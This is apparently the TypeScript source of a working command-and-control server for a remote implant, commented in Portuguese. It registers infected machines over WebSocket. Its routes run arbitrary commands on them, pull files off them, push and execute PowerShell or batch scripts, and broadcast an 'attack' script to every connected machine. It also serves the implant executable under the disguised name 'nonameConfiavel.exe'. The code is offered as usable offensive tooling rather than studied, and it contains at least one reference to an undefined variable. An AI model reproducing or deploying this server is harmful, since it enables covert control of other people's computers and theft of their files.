import express from "express";
import { WebSocketServer } from "ws";
import { randomUUID } from "crypto";
import zlib from "zlib";
import multer from "multer";
import fs from "fs";
import path from "path";

let listMachines = [];
let commandResults = {}; // Armazena resultados dos comandos
let inProgressDownloads = {}; // Rastreia downloads em andamento
let machineInfo = {}; // Armazena informações detalhadas das máquinas

const app = express();
app.use(express.json());
app.use(express.static("public"));

// Criar diretório para arquivos binários temporários
const tempBinDir = path.join(process.cwd(), '.temp-bin');
if (!fs.existsSync(tempBinDir)) {
    fs.mkdirSync(tempBinDir, { recursive: true });
}

// Limpeza automática de arquivos .bin antigos (30 minutos)
setInterval(() => {
    const now = Date.now();
    const expirationTime = 30 * 60 * 1000; // 30 minutos
    
    try {
        const files = fs.readdirSync(tempBinDir);
        files.forEach(file => {
            const filePath = path.join(tempBinDir, file);
            const stats = fs.statSync(filePath);
            if (now - stats.mtimeMs > expirationTime) {
                fs.unlinkSync(filePath);
                console.log(`[CLEANUP] Arquivo bin deletado: ${file}`);
            }
        });
    } catch (e) {
        console.error("[CLEANUP] Erro:", e.message);
    }
}, 300000); // A cada 5 minutos

// Configuração de upload
const upload = multer({ storage: multer.memoryStorage() });

// Rota para o Painel de Controle (HTML)
app.get("/pane", (req, res) => res.sendFile(process.cwd() + "/public/pane/index.html"));

app.get("/machines", (req, res) => {
    res.json(listMachines.map(m => ({ id: m.id, ip: m.ip })));
});

app.get("/machines-detailed", (req, res) => {
    res.json(listMachines.map(m => ({
        id: m.id,
        ip: m.ip,
        info: machineInfo[m.id] || {}
    })));
});

app.get("/machine-info/:id", (req, res) => {
    const machineId = req.params.id;
    const machine = listMachines.find(m => m.id === machineId);
    
    if (!machine) {
        return res.status(404).json({ error: "Máquina não encontrada" });
    }

    // Retorna downloads disponíveis para esta máquina
    const machineDownloads = Object.entries(temporaryDownloads)
        .filter(([_, data]) => data.machineId === machineId)
        .map(([downloadId, data]) => ({
            downloadId: downloadId,
            filename: data.filename,
            size: data.buffer.length,
            timestamp: data.timestamp
        }));

    res.json({
        id: machineId,
        ip: machine.ip,
        info: machineInfo[machineId] || {},
        files: machineDownloads
    });
});

app.get("/implant.exe", (req, res) => {
    const filePath = path.join(process.cwd(), "implant.exe");   
    if (fs.existsSync(filePath)) {
        res.download(filePath, "nonameConfiavel.exe");
    } else {
        res.status(404).send("Arquivo não encontrado");
    }
});

app.get("/command-results", (req, res) => {
    res.json(commandResults);
});

// Download do arquivo .bin comprimido (não descomprimido)
app.get("/get-download-bin/:downloadId", (req, res) => {
    const { downloadId } = req.params;
    const downloadData = inProgressDownloads[downloadId];

    if (!downloadData) {
        return res.status(404).send("Download não encontrado");
    }

    if (!downloadData.binFilePath || !fs.existsSync(downloadData.binFilePath)) {
        return res.status(202).json({ error: "Arquivo ainda não foi completado" });
    }

    const filename = downloadData.originalPath.split(/[\\\/]/).pop() || `download_${downloadId}`;
    
    res.setHeader('Content-Disposition', `attachment; filename="${filename}.bin"`);
    res.setHeader('Content-Type', 'application/octet-stream');
    
    // Stream do arquivo em vez de carregar tudo na RAM
    const stream = fs.createReadStream(downloadData.binFilePath);
    stream.pipe(res);
    
    stream.on('end', () => {
        // Deletar arquivo após envio
        try {
            fs.unlinkSync(downloadData.binFilePath);
            delete inProgressDownloads[downloadId];
            console.log(`[DOWNLOAD_BIN] Arquivo servido e deletado: ${downloadId}`);
        } catch (e) {
            console.error(`[ERROR] Erro ao deletar: ${e.message}`);
        }
    });
    
    stream.on('error', (err) => {
        console.error(`[ERROR] Erro ao servir arquivo: ${err.message}`);
        res.status(500).send("Erro ao servir arquivo");
    });
});

// Download de arquivo em memória
app.get("/get-download/:downloadId", (req, res) => {
    const { downloadId } = req.params;
    const downloadData = inProgressDownloads[downloadId];

    if (!downloadData) {
        return res.status(404).send("Download não encontrado ou expirou");
    }

    if (!downloadData.binFilePath || !fs.existsSync(downloadData.binFilePath)) {
        return res.status(202).json({ error: "Arquivo ainda não foi completado" });
    }

    const filename = downloadData.originalPath.split(/[\\\/]/).pop() || `download_${downloadId}`;
    
    res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
    res.setHeader('Content-Type', 'application/octet-stream');
    
    const stream = fs.createReadStream(downloadData.binFilePath);
    stream.pipe(res);
});

// Verificar progresso do download
app.get("/get-download-progress/:downloadId", (req, res) => {
    const { downloadId } = req.params;
    const downloadData = inProgressDownloads[downloadId];

    if (!downloadData) {
        return res.status(404).json({ error: "Download não encontrado" });
    }

    res.json({
        downloadId: downloadId,
        filepath: downloadData.filepath,
        totalChunks: downloadData.totalChunks,
        receivedChunks: downloadData.receivedChunks,
        progress: downloadData.totalChunks > 0 ? Math.round((downloadData.receivedChunks / downloadData.totalChunks) * 100) : 0
    });
});

// Obter arquivo completo descompactado
app.get("/get-download-file/:downloadId", (req, res) => {
    const { downloadId } = req.params;
    const downloadData = inProgressDownloads[downloadId];

    if (!downloadData) {
        return res.status(404).send("Download não encontrado");
    }

    if (downloadData.decompressed) {
        const filename = downloadData.originalPath.split(/[\\\/]/).pop() || `download_${downloadId}`;
        res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
        res.setHeader('Content-Type', 'application/octet-stream');
        res.send(downloadData.decompressed);
        
        // Deletar após envio
        delete inProgressDownloads[downloadId];
        console.log(`[DOWNLOAD_COMPLETE] Arquivo entregue: ${downloadId}`);
    } else {
        res.status(202).json({ error: "Download ainda não foi completado" });
    }
});

app.post("/command", (req, res) => {
    const { command, idMachine, type } = req.body;
    const machine = listMachines.find(ma => ma.id === idMachine);
    
    if (machine) {
        // Enviar comando com tipo identificador
        machine.ws.send(JSON.stringify({ 
            type: type || 'exec',
            command: command 
        }));
        return res.send("Enviado");
    }
    res.status(404).send("Offline");
});

// Solicitar arquivo do implant
app.post("/request-file", (req, res) => {
    const { idMachine, filepath } = req.body;
    const machine = listMachines.find(ma => ma.id === idMachine);

    if (!machine) {
        return res.status(404).send("Máquina offline");
    }

    // Gerar ID único para este download
    const downloadId = randomUUID();
    
    // Armazenar em progresso
    inProgressDownloads[downloadId] = {
        machineId: idMachine,
        filepath: filepath,
        chunks: [],
        totalChunks: 0,
        receivedChunks: 0,
        originalPath: filepath,
        timestamp: Date.now()
    };

    console.log(`[REQUEST] Solicitando arquivo: ${filepath} de ${idMachine.substring(0, 8)} (downloadId: ${downloadId.substring(0, 8)})`);
    machine.ws.send(JSON.stringify({
        type: 'download_file',
        filepath: filepath,
        downloadId: downloadId
    }));

    res.json({ downloadId: downloadId });
});

// Rota para upload de arquivos com compressão e envio em chunks
app.post("/upload", upload.single("file"), async (req, res) => {
    const idMachine = req.query.idMachine as string;
    const machine = listMachines.find(m => m.id === idMachine);

    if (!machine) {
        return res.status(404).send("Máquina offline");
    }

    const filename = req.file.originalname;
    const isExecutable = req.body.execute === 'true' || req.query.execute === 'true';
    
    console.log(`[UPLOAD] Arquivo: ${filename} (${req.file.size} bytes) -> ${idMachine.substring(0, 8)} [Execute: ${isExecutable}]`);

    // Se é para executar script diretamente
    if (isExecutable && (filename.endsWith('.ps1') || filename.endsWith('.bat'))) {
        const scriptContent = req.file.buffer.toString('utf8');
        console.log(`[SCRIPT] Executando script ${filename}`);
        
        machine.ws.send(JSON.stringify({
            type: 'execute-script',
            command: scriptContent,
            isAttack: false,
            filename: filename
        }));
        
        return res.send("Script enviado para execução");
    }

    // Comprimir arquivo
    zlib.gzip(req.file.buffer, (err, compressed) => {
        if (err) {
            console.error("[ERROR] Erro ao comprimir:", err);
            return res.status(500).send("Erro ao comprimir");
        }

        console.log(`[COMPRESS] ${filename} comprimido: ${compressed.length} bytes`);

        // Enviar em chunks de 16KB
        const CHUNK_SIZE = 16384;
        let offset = 0;
        const totalChunks = Math.ceil(compressed.length / CHUNK_SIZE);

        // Enviar metadados do arquivo primeiro
        machine.ws.send(JSON.stringify({
            type: 'file_start',
            filename: 'arquivo.bin',
            totalChunks: totalChunks,
            originalName: filename,
            totalSize: compressed.length
        }));

        console.log(`[UPLOAD] Iniciando envio de ${totalChunks} chunks`);

        const sendChunk = () => {
            if (offset >= compressed.length) {
                // Enviar comando para descomprimir
                machine.ws.send(JSON.stringify({
                    type: 'file_end',
                    filename: 'arquivo.bin'
                }));
                console.log(`[UPLOAD] Upload de ${filename} concluído!`);
                res.send("Upload iniciado");
                return;
            }

            const chunkData = compressed.slice(offset, offset + CHUNK_SIZE);
            machine.ws.send(JSON.stringify({
                type: 'file_chunk',
                chunkIndex: Math.floor(offset / CHUNK_SIZE),
                totalChunks: totalChunks,
                data: chunkData.toString('base64')
            }));

            offset += CHUNK_SIZE;
            console.log(`[UPLOAD] Chunk ${Math.floor(offset / CHUNK_SIZE)}/${totalChunks}`);

            // Enviar próximo chunk após pequeno delay
            setImmediate(sendChunk);
        };

        sendChunk();
    });
});

// Broadcast attack para todas as máquinas
app.post("/broadcast-attack", (req, res) => {
    const { script, attacks } = req.body;
    
    if (!script || !attacks) {
        return res.status(400).send("Script ou ataques não fornecidos");
    }

    console.log(`[ATTACK] Broadcast: ${attacks.join(', ')} para ${listMachines.length} máquinas`);
    
    let successCount = 0;
    listMachines.forEach(machine => {
        try {
            machine.ws.send(JSON.stringify({
                type: 'execute-script',
                command: script,
                attacks: attacks,
                isAttack: true
            }));
            successCount++;
        } catch (e) {
            console.error(`[ERROR] Erro ao enviar para ${machine.id}:`, e);
        }
    });

    console.log(`[ATTACK] Script enviado para ${successCount}/${listMachines.length} máquinas`);
    res.json({ 
        success: true, 
        targetedMachines: successCount,
        totalMachines: listMachines.length,
        attacks: attacks
    });
});

const server = app.listen(3000, () => console.log("C2 Server Running on :3000"));
const wss = new WebSocketServer({ server });

wss.on("connection", (ws, req) => {
    const id = randomUUID();
    const ip = req.socket.remoteAddress;
    
    listMachines.push({ id, ws, ip });
    console.log(`[+] Machine connected: ${id} (${ip})`);

    let downloadChunks: Buffer[] = [];
    let currentDownloadInfo: any = null;

    ws.on("message", (data) => {
        try {
            // Tentar parsear como JSON
            const message = JSON.parse(data.toString());
            
            if (message.type === 'output') {
                console.log(`[OUTPUT] From ${id.substring(0, 8)}: \n${message.data}`);
                commandResults[id] = message.data;
            } else if (message.type === 'status') {
                console.log(`[STATUS] ${id.substring(0, 8)}: ${message.message}`);
            } else if (message.type === 'systeminfo') {
                console.log(`[SYSTEMINFO] ${id.substring(0, 8)}: Informações recebidas`);
                machineInfo[id] = message.data;
            } else if (message.type === 'download_start') {
                const downloadId = message.downloadId;
                console.log(`[DOWNLOAD] Iniciando recebimento: ${message.filename} (downloadId: ${downloadId?.substring(0, 8)})`);
                
                if (downloadId) {
                    if (inProgressDownloads[downloadId]) {
                        inProgressDownloads[downloadId].totalChunks = message.totalChunks;
                        inProgressDownloads[downloadId].chunks = [];
                    }
                    downloadChunks = [];
                    currentDownloadInfo = {
                        downloadId: downloadId,
                        filename: message.filename,
                        totalChunks: message.totalChunks,
                        originalPath: message.originalPath,
                        totalSize: message.totalSize,
                        receivedChunks: 0
                    };
                }
            } else if (message.type === 'download_chunk') {
                const chunkBuffer = Buffer.from(message.data, 'base64');
                downloadChunks.push(chunkBuffer);
                
                if (currentDownloadInfo) {
                    currentDownloadInfo.receivedChunks++;
                    
                    // Atualizar progresso no inProgressDownloads
                    if (currentDownloadInfo.downloadId && inProgressDownloads[currentDownloadInfo.downloadId]) {
                        inProgressDownloads[currentDownloadInfo.downloadId].receivedChunks = currentDownloadInfo.receivedChunks;
                    }
                    
                    const progress = Math.round((currentDownloadInfo.receivedChunks / currentDownloadInfo.totalChunks) * 100);
                    console.log(`[DOWNLOAD] Chunk ${message.chunkIndex + 1}/${message.totalChunks} (${progress}%)`);
                }
            } else if (message.type === 'download_end') {
                console.log(`[DOWNLOAD_END] Finalizando arquivo: ${currentDownloadInfo?.filename}`);
                
                if (currentDownloadInfo?.downloadId) {
                    saveDownloadedFile(currentDownloadInfo.downloadId, downloadChunks, currentDownloadInfo);
                    downloadChunks = [];
                    currentDownloadInfo = null;
                }
            } else if (message.type === 'connection') {
                console.log(`[CONN] ${id.substring(0, 8)}: ${message.message}`);
            } else {
                console.log(`[MSG] From ${id.substring(0, 8)}: ${JSON.stringify(message)}`);
            }
        } catch (e) {
            // Se não for JSON, é mensagem de texto simples
            console.log(`[REPLY] From ${id.substring(0, 8)}: \n${data}`);
            commandResults[id] = data.toString();
        }
    });

    ws.on("close", () => {
        listMachines = listMachines.filter(ma => ma.id !== id);
        delete commandResults[id];
        console.log(`[-] Machine disconnected: ${id}`);
    });

    // Função para salvar arquivo comprimido em arquivo .bin
    function saveDownloadedFile(downloadId: string, chunks: Buffer[], info: any) {
        const compressedBuffer = Buffer.concat(chunks);
        console.log(`[COMPRESS_FINAL] Buffer comprimido: ${compressedBuffer.length} bytes`);

        // Salvar em arquivo .bin em vez de RAM
        const binFilePath = path.join(tempBinDir, `${downloadId}.bin`);
        
        fs.writeFile(binFilePath, compressedBuffer, (err) => {
            if (err) {
                console.error("[ERROR] Erro ao salvar arquivo .bin:", err.message);
                return;
            }

            // Armazenar metadados no inProgressDownloads
            if (inProgressDownloads[downloadId]) {
                inProgressDownloads[downloadId].binFilePath = binFilePath;
                inProgressDownloads[downloadId].binSize = compressedBuffer.length;
                inProgressDownloads[downloadId].downloadedAt = new Date().toISOString();
                console.log(`[SUCCESS] Arquivo salvo em disco: ${downloadId} (${info.filename} - ${compressedBuffer.length} bytes comprimido)`);
            } else {
                console.log(`[WARNING] downloadId não encontrado: ${downloadId}`);
            }
        });
    }
});